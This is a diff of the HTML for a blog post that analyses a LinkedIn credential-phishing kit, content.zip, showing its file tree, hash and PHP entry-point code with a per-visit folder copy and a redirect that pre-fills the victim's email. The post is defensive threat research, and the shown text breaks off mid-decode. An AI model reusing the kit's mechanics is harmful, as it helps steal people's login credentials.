@@ -1,173 +1,201 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="auto">
 
-    <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta http-equiv="Content-Language" content="en">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Phishing findings, campaign #2: content.zip (LinkedIn) | andpalmier</title>
+<meta name="keywords" content="phishing, phishingkit, linkedin">
+<meta name="description" content="Analysis of a phishing kit targeting LinkedIn users">
+<meta name="author" content="">
+<link rel="canonical" href="https://andpalmier.com/posts/phishing-findings-2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3f372934d1c1362b71cc19fea0df71fd2f6c0538b2e002dcd947350384804cad.css" integrity="sha256-PzcpNNHBNitxzBn&#43;oN9x/S9sBTiy4ALc2Uc1A4SATK0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://andpalmier.com/images/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://andpalmier.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://andpalmier.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://andpalmier.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://andpalmier.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
 
-	<meta name="author" content="Andrea Palmieri">
-	<meta name="description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
-How this phishing kit looks like when deployed
-At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:">
-	<meta name="keywords" content="blog, infosec, security, cyber security">
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
 
-	<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)"/>
-<meta name="twitter:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
-How this phishing kit looks like when deployed
-At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:"/>
+            .list {
+                background: var(--theme);
+            }
 
-	<meta property="og:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)" />
-<meta property="og:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
-How this phishing kit looks like when deployed
-At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:" />
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)" />
+<meta property="og:description" content="Analysis of a phishing kit targeting LinkedIn users" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/phishing-findings-2/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://andpalmier.com/posts/phishing-findings-2/" /><meta property="og:image" content="https://andpalmier.com/papermod-cover.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-07-08T00:00:00+00:00" />
 <meta property="article:modified_time" content="2020-07-08T00:00:00+00:00" />
 
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://andpalmier.com/papermod-cover.png"/>
+
+<meta name="twitter:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)"/>
+<meta name="twitter:description" content="Analysis of a phishing kit targeting LinkedIn users"/>
 
 
-	
-	<base href="/posts/phishing-findings-2/">
-	
-	<title>
-  Phishing findings, campaign #2: content.zip (LinkedIn) · andpalmier
-</title>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://andpalmier.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Phishing findings, campaign #2: content.zip (LinkedIn)",
+      "item": "https://andpalmier.com/posts/phishing-findings-2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Phishing findings, campaign #2: content.zip (LinkedIn)",
+  "name": "Phishing findings, campaign #2: content.zip (LinkedIn)",
+  "description": "Analysis of a phishing kit targeting LinkedIn users",
+  "keywords": [
+    "phishing", "phishingkit", "linkedin"
+  ],
+  "articleBody": " I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet’s start from the beginning The kit was created to steal LinkedIn credentials:\nHow this phishing kit looks like when deployed\nAt a first look, we can notice some characteristics of this page which makes it different from the usual fake login:\nthe message at the top: “Send Your Product quotes to interested buyers via LinkedIn” the two input fields for the password (and the missing ‘Forgot password?’ link) the message under the Continue button: “By clicking Continue you proceed to send your business catalogues and quotes” So this page is not targeting the usual LinkedIn user: it is pretending to provide a feature to send catalogues and quotes using the social network.\nLet’s now check the zip of this kit on VirusTotal, using sha256sum:\n$ sha256sum content.zip e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b content.zip VirusTotal detections for the zip of this phishing kit\nExplore the kit If we extract the archive, we will see the following structure:\n$ tree -a content content ├── blocker.php ├── .htaccess ├── index.php ├── Linkedin │ ├── geoplugin.class.php │ ├── index.php │ └── loginss.php ├── robots.txt └── vu.txt 1 directory, 7 files This kit is simpler than the one analyzed in the previous post, and it contains only the LinkedIn template. The presence of a txt file (vu.txt) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a .htaccess and robots.txt files are shipped with the kit itself.\nEntry point So we can start our analysis from the entry point (index.php), here are the first lines:\n\u003c?php $emai = $_GET['user']; include('blocker.php'); $DIR=md5(rand(0,100000000000)); function recurse_copy($home,$DIR) { $dir = opendir($home); @mkdir($DIR); while(false !== ( $file = readdir($dir)) ) { if (( $file != '.' ) \u0026\u0026 ( $file != '..' )) { if ( is_dir($home . '/' . $file) ) { recurse_copy($home . '/' . $file,$DIR . '/' . $file); } else { copy($home . '/' . $file,$DIR . '/' . $file); } } } closedir($dir); } $home=\"Linkedin\"; recurse_copy( $home, $DIR ); We will take a look at blocker.php in the next paragraph, for now, let’s just say that it is included, and let’s focus on the following lines. A new directory is created using @mkdir, and it has a name obtained from the md5 hash of a random number: this means that a new folder will be created every time index.php is reached. The files included in the ‘Linkedin’ folder are then copied in this newly created folder using the recurse_copy function.\nLet’s continue with the definition of a header:\n\u003c?php header(\"location:$DIR?user=$emai\u0026.verify?service=mail\u0026data:text/html;charset=utf-8;base64, PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt\"); Some parameters are specified for a redirection: location is equal to the newly created folder, user equal to $_GET['user'] (it will be used to automatically fill the email address in the fake LinkedIn form) and service is set to mail. This header also includes a base64 string which can easily be decoded:\n$ echo 'PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt' | base64 -d ",
+  "wordCount" : "1667",
+  "inLanguage": "en",
+  "datePublished": "2020-07-08T00:00:00Z",
+  "dateModified": "2020-07-08T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://andpalmier.com/posts/phishing-findings-2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "andpalmier",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://andpalmier.com/images/favicon-32x32.png"
+    }
+  }
+}
+</script>
+</head>
 
-	
-	<link rel="canonical" href="/posts/phishing-findings-2/">
-	
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
 
-	<link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+</script>
 
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder.min.d5c572a4dda2996f45f4bd9e584d43751439ce2134c33701e8d32920cc8e7d92.css" integrity="sha256-1cVypN2imW9F9L2eWE1DdRQ5ziE0wzcB6NMpIMyOfZI=" crossorigin="anonymous" media="screen" />
-	
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://andpalmier.com" accesskey="h" title="andpalmier (Alt + H)">andpalmier</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://andpalmier.com/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://andpalmier.com/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
 
-	
-
-	
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder-dark.min.58ba09b2c45d36fcfc1a96c8ad83bbbc03a9de4bce8463f3c30a896134febfb3.css" integrity="sha256-WLoJssRdNvz8GpbIrYO7vAOp3kvOhGPzwwqJYTT&#43;v7M=" crossorigin="anonymous" media="screen" />
-	
-	
-
-	
-	<link rel="stylesheet" href="/css/extra-style.css" />
-	
-
-	
-
-	<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-	<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-	
-
-	<meta name="generator" content="Hugo 0.106.0">
-    </head>
-
+<article class="post-single">
+  <header class="post-header">
     
-    
-    
-    
-    <body class="colorscheme-dark"
+    <h1 class="post-title">
+      Phishing findings, campaign #2: content.zip (LinkedIn)
+    </h1>
+    <div class="post-meta"><span title='2020-07-08 00:00:00 +0000 UTC'>July 8, 2020</span>&nbsp;·&nbsp;8 min
 
-	  onload=""
-	  >
-	  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
 </div>
-
-
-	  <main class="wrapper">
-	      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="/">
-      andpalmier
-    </a>
-    
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
-      
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/">Home</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/about/">About</a>
-          </li>
-        
-      
-      
-    </ul>
-    
-  </section>
-</nav>
-
-
-	      <div class="content">
-		  
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">Phishing findings, campaign #2: content.zip (LinkedIn)</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2020-07-08T00:00:00Z'>
-                July 8, 2020
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              8-minute read
-            </span>
-          </div>
-          <div class="categories">
-  <i class="fas fa-folder"></i>
-    <a href="/categories/phishing/">phishing</a></div>
-
-          <div class="tags">
-  <i class="fas fa-tag"></i>
-    <a href="/tags/phishing/">phishing</a>
-      <span class="separator">•</span>
-    <a href="/tags/phishingkit/">phishingkit</a>
-      <span class="separator">•</span>
-    <a href="/tags/linkedin/">linkedin</a></div>
-
-        </div>
-      </header>
-
-      <div>
-        
-        <figure><img src="/images/posts/phishing-findings/sampei.jpeg"/>
+  </header> 
+  <div class="post-content"><figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/sampei.jpeg#center"
+         alt="Sampei"/> 
 </figure>
 
-<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier">here</a> if you are interested!
+<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier" target="_blank" rel="noopener">here</a> if you are interested!
 In this series of posts I am going to analyze and discuss some of the phishing kits found online.</p>
-<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning</h2>
+<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning<a hidden class="anchor" aria-hidden="true" href="#lets-start-from-the-beginning">#</a></h2>
 <p>The kit was created to steal LinkedIn credentials:</p>
-<figure><img src="/images/posts/phishing-findings/ep2/content.png"
-         alt="How this phishing kit looks like when deployed"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep2/content.png#center"
+         alt="screenshot of the phishing page"/> <figcaption>
             <p>How this phishing kit looks like when deployed</p>
         </figcaption>
 </figure>
@@ -180,310 +208,348 @@ In this series of posts I am going to analyze and discuss some of the phishing k
 </ul>
 <p>So this page is not targeting the usual LinkedIn user: it is pretending to provide a feature to send catalogues and quotes using the social network.</p>
 <p>Let&rsquo;s now check the zip of this kit on VirusTotal, using <code>sha256sum</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sha256sum content.zip
-</span></span><span style="display:flex;"><span>e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b  content.zip
-</span></span></code></pre></div><figure><img src="/images/posts/phishing-findings/ep2/vtcontentzip.png"
-         alt="VirusTotal detections for the zip of this phishing kit"/><figcaption>
-            <p><a href="https://www.virustotal.com/gui/file/e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b/detection">VirusTotal detections for the zip of this phishing kit</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sha256sum content.zip
+</span></span><span class="line"><span class="cl">e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b  content.zip
+</span></span></code></pre></div><figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep2/vtcontentzip.png#center"
+         alt="VirusTotal detection of the kit"/> <figcaption>
+            <p><a href="https://www.virustotal.com/gui/file/e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b/detection" target="_blank" rel="noopener">VirusTotal detections for the zip of this phishing kit</a></p>
         </figcaption>
 </figure>
 
-<h2 id="explore-the-kit">Explore the kit</h2>
+<h2 id="explore-the-kit">Explore the kit<a hidden class="anchor" aria-hidden="true" href="#explore-the-kit">#</a></h2>
 <p>If we extract the archive, we will see the following structure:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tree -a content
-</span></span><span style="display:flex;"><span>content
-</span></span><span style="display:flex;"><span>├── blocker.php
-</span></span><span style="display:flex;"><span>├── .htaccess
-</span></span><span style="display:flex;"><span>├── index.php
-</span></span><span style="display:flex;"><span>├── Linkedin
-</span></span><span style="display:flex;"><span>│   ├── geoplugin.class.php
-</span></span><span style="display:flex;"><span>│   ├── index.php
-</span></span><span style="display:flex;"><span>│   └── loginss.php
-</span></span><span style="display:flex;"><span>├── robots.txt
-</span></span><span style="display:flex;"><span>└── vu.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> directory, <span style="color:#ae81ff">7</span> files
-</span></span></code></pre></div><p>This kit is simpler than the one analyzed in <a href="https://andpalmier.github.io/posts/phishing-findings-1/">the previous post</a>, and it contains only the LinkedIn template. The presence of a <em>txt</em> file (<code>vu.txt</code>) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a <code>.htaccess</code> and <code>robots.txt</code> files are shipped with the kit itself.</p>
-<h2 id="entry-point">Entry point</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tree -a content
+</span></span><span class="line"><span class="cl">content
+</span></span><span class="line"><span class="cl">├── blocker.php
+</span></span><span class="line"><span class="cl">├── .htaccess
+</span></span><span class="line"><span class="cl">├── index.php
+</span></span><span class="line"><span class="cl">├── Linkedin
+</span></span><span class="line"><span class="cl">│   ├── geoplugin.class.php
+</span></span><span class="line"><span class="cl">│   ├── index.php
+</span></span><span class="line"><span class="cl">│   └── loginss.php
+</span></span><span class="line"><span class="cl">├── robots.txt
+</span></span><span class="line"><span class="cl">└── vu.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">1</span> directory, <span class="m">7</span> files
+</span></span></code></pre></div><p>This kit is simpler than the one analyzed in <a href="https://andpalmier.github.io/posts/phishing-findings-1/" target="_blank" rel="noopener">the previous post</a>, and it contains only the LinkedIn template. The presence of a <em>txt</em> file (<code>vu.txt</code>) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a <code>.htaccess</code> and <code>robots.txt</code> files are shipped with the kit itself.</p>
+<h2 id="entry-point">Entry point<a hidden class="anchor" aria-hidden="true" href="#entry-point">#</a></h2>
 <p>So we can start our analysis from the entry point (<code>index.php</code>), here are the first lines:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$emai <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;user&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;blocker.php&#39;</span>);
-</span></span><span style="display:flex;"><span>$DIR<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">100000000000</span>));
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">recurse_copy</span>($home,$DIR) {
-</span></span><span style="display:flex;"><span>    $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>($home);
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($DIR);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">false</span> <span style="color:#f92672">!==</span> ( $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>($dir)) ) {
-</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> (( $file <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;.&#39;</span> ) <span style="color:#f92672">&amp;&amp;</span> ( $file <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;..&#39;</span> )) {
-</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">is_dir</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file) ) {
-</span></span><span style="display:flex;"><span>			    <span style="color:#a6e22e">recurse_copy</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file,$DIR <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file);
-</span></span><span style="display:flex;"><span>		    } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>			    <span style="color:#a6e22e">copy</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file,$DIR <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file);
-</span></span><span style="display:flex;"><span>		    }
-</span></span><span style="display:flex;"><span>	    }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">closedir</span>($dir);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>$home<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Linkedin&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recurse_copy</span>( $home, $DIR );
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$emai</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;blocker.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$DIR</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100000000000</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">recurse_copy</span><span class="p">(</span><span class="nv">$home</span><span class="p">,</span><span class="nv">$DIR</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dir</span> <span class="o">=</span> <span class="nx">opendir</span><span class="p">(</span><span class="nv">$home</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$DIR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nx">readdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span> <span class="p">((</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s1">&#39;.&#39;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s1">&#39;..&#39;</span> <span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_dir</span><span class="p">(</span><span class="nv">$home</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			    <span class="nx">recurse_copy</span><span class="p">(</span><span class="nv">$home</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">,</span><span class="nv">$DIR</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			    <span class="nx">copy</span><span class="p">(</span><span class="nv">$home</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">,</span><span class="nv">$DIR</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">closedir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$home</span><span class="o">=</span><span class="s2">&#34;Linkedin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">recurse_copy</span><span class="p">(</span> <span class="nv">$home</span><span class="p">,</span> <span class="nv">$DIR</span> <span class="p">);</span>
 </span></span></code></pre></div><p>We will take a look at <code>blocker.php</code> in the next paragraph, for now, let&rsquo;s just say that it is included, and let&rsquo;s focus on the following lines.
 A new directory is created using <code>@mkdir</code>, and it has a name obtained from the <em>md5</em> hash of a random number: this means that a new folder will be created every time <code>index.php</code> is reached. The files included in the <em>&lsquo;Linkedin&rsquo;</em> folder are then copied in this newly created folder using the <code>recurse_copy</code> function.</p>
 <p>Let&rsquo;s continue with the definition of a header:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location:</span><span style="color:#e6db74">$DIR</span><span style="color:#e6db74">?user=</span><span style="color:#e6db74">$emai</span><span style="color:#e6db74">&amp;.verify?service=mail&amp;data:text/html;charset=utf-8;base64,
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#34;</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:</span><span class="si">$DIR</span><span class="s2">?user=</span><span class="si">$emai</span><span class="s2">&amp;.verify?service=mail&amp;data:text/html;charset=utf-8;base64,
+</span></span></span><span class="line"><span class="cl"><span class="s2">    PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#34;</span><span class="p">);</span>
 </span></span></code></pre></div><p>Some parameters are specified for a redirection: <em>location</em> is equal to the newly created folder, <em>user</em> equal to <code>$_GET['user']</code> (it will be used to automatically fill the email address in the fake LinkedIn form) and <em>service</em> is set to <em>mail</em>. This header also includes a base64 string which can easily be decoded:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#39;</span> | base64 -d
-</span></span><span style="display:flex;"><span>&lt;html&gt;
-</span></span><span style="display:flex;"><span>&lt;style&gt; body <span style="color:#f92672">{</span> margin: 0; overflow: hidden; <span style="color:#f92672">}</span> &lt;/style&gt;
-</span></span><span style="display:flex;"><span>  &lt;ifram%
